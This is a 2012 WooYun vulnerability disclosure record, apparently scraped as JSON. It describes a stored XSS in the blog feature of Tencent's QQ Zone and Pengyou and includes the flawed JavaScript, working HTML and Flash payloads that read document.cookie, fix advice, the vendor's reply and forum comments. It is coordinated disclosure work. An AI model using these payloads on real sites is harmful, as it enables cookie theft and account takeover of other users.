{"id": 15911, "wybug_id": "wooyun-2012-013721", "wybug_title": "PKAV腾讯专场 - 6. （QQ空间+朋友网）日志功能存储型XSS", "wybug_corp": "腾讯", "wybug_author": "gainover", "wybug_date": "2012-10-22 14:25", "wybug_open_date": "2012-12-06 14:25", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-10-22：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-10-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-11-03：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-11-13：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-11-23：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2012-12-06：\t细节向公众公开  简要描述： 此漏洞影响腾讯2大主要的社区日志功能，QQ空间和朋友网的前端和后端是一套逻辑，就不分开提交了。漏洞相关信息日后会同步至pkav.net。 详细说明：  缺陷文件：http://cnc.qzs.qq.com/qzone/newblog/v5/script/common.jshttp://qzs.pengyou.com/qzone/newblog/v5/script/common.js缺陷代码：\nQZBlog.Logic.initMusicPlayer = function() {    var arr = document.getElementsByName(\"musicFlash**\");    if (arr.length > 0) {        var musicParams = [];        for (var index = 0; index < arr.length; ++index) {            var ubb = arr[index].getAttribute('ubb');            if ( !! ubb) {                musicParams.push(ubb);                if (!QZFL.userAgent.ie) {                    var is_multi = ubb.split(\"|\").length > 7;                    var width = arr[index].width;                    var height = arr[index].height;                    var _div_height = is_multi ? 200: 120;                    var _div_width = is_multi ? 386: 360;                    var src = 'http://' + IMGCACHE_DOMAIN + '/music/musicbox_v2_1/img/MusicFlash.swf';                    var span = document.createElement('span');                    span.style.cssText = 'display:inline-block; height:' + _div_height + 'px;width:' + _div_width + 'px; overflow:hidden; vertical-align:baseline';                    var parent = arr[index].parentNode;                    parent.replaceChild(span, arr[index]);                    span.innerHTML = '<object type=\"application/x-shockwave-flash\" data=\"' + src + '\" width=\"' + width + '\" height=\"' + height + '\" name=\"musicFlash' + (musicParams.length - 1) + '\" id=\"musicFlash' + (musicParams.length - 1) + '\" align=\"middle\" ubb=\"' + ubb + '\">' + '<param name=\"movie\" value=\"' + src + '\" />' + '<param name=\"quality\" value=\"high\" />' + '<param name=\"bgcolor\" value=\"#ffffff\" />' + '<param name=\"play\" value=\"true\" />' + '<param name=\"loop\" value=\"true\" />' + '<param name=\"wmode\" value=\"transparent\" />' + '<param name=\"scale\" value=\"showall\" />' + '<param name=\"menu\" value=\"true\" />' + '<param name=\"salign\" value=\"\" />' + '<param name=\"allowScriptAccess\" value=\"always\" />' + '</object></span>';                    index--;                } else {                    arr[index].id = \"musicFlash\" + (musicParams.length - 1);                    if (QZFL.userAgent.ie < 9) {                        arr[index].name = \"musicFlash\" + (musicParams.length - 1);                    }                }            }        }        if (musicParams.length > 0) {            var jsLoader = new QZONE.jsLoader();            jsLoader.onload = function() {                initMusicData.apply(null, musicParams);            };            jsLoader.load(\"/music/musicbox_v2_1/js/musicblog_player.js\", document, \"GB2312\");        }    }};\n1. 首先看看上面这个代码。2. 它的大致流程如下：2.1 搜索日志里所有name=\"musicFlash**\"的元素。然后循环对每一个元素处理2.2 拿一次循环为例，可以看到取出了name=\"musicFlash**\"元素的 ubb 属性。2.3 而后，在span.innerHTML这段代码中， ubb=\"' + ubb + '\" 这个地方直接加了进去。2.4 因此这里没有做过滤，会造成XSS。3. 那么利用代码怎么写呢？因为日志功能是富文本，不可能屏蔽掉所有的HTML标签。div 标记一般是允许的。那么我们利用div来编写利用代码。\n<div name=\"musicFlash**\" ubb=\"&quot;&gt;&lt/object&gt;&lt;img src=&quot;1&quot; onerror=&quot;alert(document.cookie);&quot;&gt;&lt;i a=&quot;\">xxxxxxxxx</div>\n嗯，上面就是利用代码了，很简单吧，发日志的时候，选择使用HTML方式，发送即可。\n\n其它用户访问日志后，效果如下：\n\n打开调试工具，可以看到被inject进去的代码\n\n4. 当然，还没完。。。 因为上面这个代码缺陷，仅限于非IE浏览器，为什么呢？主要是这句：如下图：\n\n5. 我们的目标是：“没有蛀牙”，只有chrome下可以，有点鸡肋了。6. 其实这里还存在一个问题。最初测试时，发现腾讯并没有过滤掉object标签，只是对object调用的swf文件的域进行了限制。也就是说 ，发送一下HTML，是不会被过滤掉的\n<div class=\"blog_details_20120222\"><div><object codeBase=\"http://fpdownload.macromedia.com/get/flashplayer/current/swflash.cab#version=8,0,0,0\" classid=\"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000\" width=\"410\" height=\"100\" src=\"http://qzs.qq.com/22222222222.swf\" bgcolor=\"#ffffff\" menu=\"true\" allowScriptAccess=\"always\" name=\"musicFlash**\" id=\"musicFlash0\" ubb='3041135817|1|http://1.qq.com/1\"><img/src=\"1\"onerror=\"alert(1)\">'><param name=\"movie\" value=\"http://qzs.qq.com/22222222222.swf\" /><param name=\"data\" value=\"http://ctc.qzs.qq.com/music/musicbox_v2_1/img/MusicFlash.swf\" /><param name=\"bgColor\" value=\"#ffffff\" /><param name=\"wmode\" value=\"transparent\" /><param name=\"menu\" value=\"true\" /><param name=\"allowScriptAccess\" value=\"always\" /></object><br></div></div>\n只要 movie的value是 http://qzs.qq.com域名下即可7. 更重要的是，这里的allowscriptaccess是等于always的。8. 那么我们只要找到一个 http://qzs.qq.com 域名下，具有缺陷的FLASH XSS即可。9. google , site:qzs.qq.com filetype:swf ，找到下面这个。\nhttp://qzs.qq.com/qzone/mall/app/vip_reward/201110/swf/play.swf?flashInit=function(){alert(document.cookie)}\n10. 接着我们在发布日志时，发布以下利用代码即可。\n<div class=\"blog_details_20120222\"><div><object codeBase=\"http://fpdownload.macromedia.com/get/flashplayer/current/swflash.cab#version=8,0,0,0\" classid=\"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000\" width=\"410\" height=\"100\" src=\"http://qzs.qq.com/qzone/mall/app/vip_reward/201110/swf/play.swf?flashInit=function(){alert(document.cookie)}\" bgcolor=\"#ffffff\" menu=\"true\" allowScriptAccess=\"always\" name=\"musicFlash**\" id=\"musicFlash0\" ubb='3041135817|1|http://1.qq.com/1\"><img/src=\"1\"onerror=\"alert(1)\">'><param name=\"movie\" value=\"http://qzs.qq.com/qzone/mall/app/vip_reward/201110/swf/play.swf?flashInit=function(){alert(document.cookie)}\" /><param name=\"data\" value=\"http://ctc.qzs.qq.com/music/musicbox_v2_1/img/MusicFlash.swf\" /><param name=\"bgColor\" value=\"#ffffff\" /><param name=\"wmode\" value=\"transparent\" /><param name=\"menu\" value=\"true\" /><param name=\"allowScriptAccess\" value=\"always\" /></object><br></div></div>\n11. 看吧，这次IE也会弹啦。\n\n   漏洞证明：  见详细说明。   修复方案：  1. 修复 QZBlog.Logic.initMusicPlayer 中的缺陷，取出ubb属性后，进行二次过滤，再输出到innerHTML。2. 这个object的always，你们自己看着修复。本身object标签就是很危险的，感觉不应该直接输出到页面。3. 修复 http://qzs.qq.com/qzone/mall/app/vip_reward/201110/swf/play.swf?flashInit=function(){alert(document.cookie)}   版权声明：转载请注明来源 gainover@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2012-10-24 15:27 厂商回复： 非常感谢您的报告。这个问题我们已经确认，正在与业务部门进行沟通制定解决方案。如有任何新的进展我们将会及时同步。 最新状态： 2012-10-25：非常感谢您的报告，目前已经完成对该漏洞的修复，请您帮助复查，有任何问题请联系我们。  ", "replys": "漏洞评价：\n评论\n     2012-10-22 14:34 |    \t\t风萧萧  \t\t\t( 核心白帽子 |\t\t\t        Rank:1020 漏洞数:76        | 人这一辈子总要动真格的爱上什么人)\t\t \n  藏了多久了洞主啊！膜拜下    \n     2012-10-22 14:44 |    \t\tMEng \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:2        | 刚接触这个领域、来学习了)\t\t \n  G牛V5，求审核    \n     2012-10-22 14:46 |    \t\tVty \t\t\t( 普通白帽子  |\t\t\t        Rank:199 漏洞数:37        )\t\t \n  感情真好    \n     2012-10-22 14:49 |    \t\tJannock  \t\t\t( 核心白帽子 |\t\t\t        Rank:2278 漏洞数:204        | 关注技术与网络安全（招人中，有兴趣请私信...)\t\t \n  占个广告位    \n     2012-10-22 15:26 |    \t\tcnrstar \t\t\t( 普通白帽子  |\t\t\t        Rank:157 漏洞数:23        | Be my personal best!)\t\t \n  等着公布享受下二哥的分析~    \n     2012-10-22 15:36 |    \t\thongygxiang \t\t\t( 普通白帽子  |\t\t\t        Rank:115 漏洞数:12        | 蛋疼)\t\t \n  广告位出售    \n     2012-10-22 15:50 |    \t\t蟋蟀哥哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:363 漏洞数:57        | 巴蜀人士,80后宅男,自学成才,天朝教育失败...)\t\t \n  有打赌的美元。。看能连载到多少    \n     2012-10-22 16:26 |    \t\tFlyR4nk \t\t\t( 普通白帽子  |\t\t\t        Rank:119 漏洞数:18        )\t\t \n  霸气啊    \n     2012-10-22 17:03 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @cnrstar 绝壁是享受    \n     2012-10-22 17:06 |    \t\tonly_guest  \t\t\t( 普通白帽子  |\t\t\t        Rank:800 漏洞数:75        | PKAV技术宅社区-专心做技术.PKAV已经暂停...)\t\t \n  总让二哥一个人连载也不合适，PKAV的其他人该出来冒冒泡了。    \n     2012-10-22 17:37 |    \t\tSunshine \t\t\t( 实习白帽子  |\t\t\t        Rank:51 漏洞数:10        | Nothing.)\t\t \n  额，@only_guest 忙着上课和训练-_-||累死了，每天十几公里    \n     2012-10-22 22:21 |    \t\tMax \t\t\t( 实习白帽子  |\t\t\t        Rank:45 漏洞数:7        | When you see this sentence, I have been ...)\t\t \n  你这样搞让小弟情何以堪呐    \n     2012-10-23 09:18 |    \t\tse55i0n \t\t\t( 普通白帽子  |\t\t\t        Rank:1567 漏洞数:173        )\t\t \n  坐等元芳的看法~    \n     2012-10-23 10:47 |    \t\tan1k3r \t\t\t( 普通白帽子  |\t\t\t        Rank:474 漏洞数:40        | 0.0)\t\t \n  支持洞主    \n     2012-10-23 12:50 |    \t\tkkappa \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:1        | 宅男！)\t\t \n  洞主，文章的密码是多少啊    \n     2012-10-23 13:14 |    \t\tonly_guest  \t\t\t( 普通白帽子  |\t\t\t        Rank:800 漏洞数:75        | PKAV技术宅社区-专心做技术.PKAV已经暂停...)\t\t \n  @kkappa 洞主要是告诉你了 @xsser 会弄死我的.    \n     2012-12-06 20:21 |    \t\tedgerror \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:1        )\t\t \n  不明觉厉...学习    \n     2012-12-15 17:09 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  这一类都是从js代码下手的额    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}